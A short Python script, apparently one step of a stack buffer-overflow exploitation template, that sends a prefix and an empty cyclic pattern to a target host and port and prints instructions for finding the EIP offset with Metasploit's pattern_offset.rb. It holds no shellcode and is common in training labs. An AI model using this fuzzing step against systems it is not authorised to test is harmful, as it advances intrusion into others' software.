#!/usr/bin/python3
from details import *
import socket

## to fill #

pattern = b""

############

s = socket.socket()
s.connect((HOST, PORT))
initial(s)

payload = [
    PREFIX,
    pattern
]
s.send(b''.join(payload))
s.close()
print(f"Copy the EIP register, run\n$(locate pattern_offset.rb) -l {len(pattern)} -q $EIP_value\nand then store the output as OFFSET in details.py")
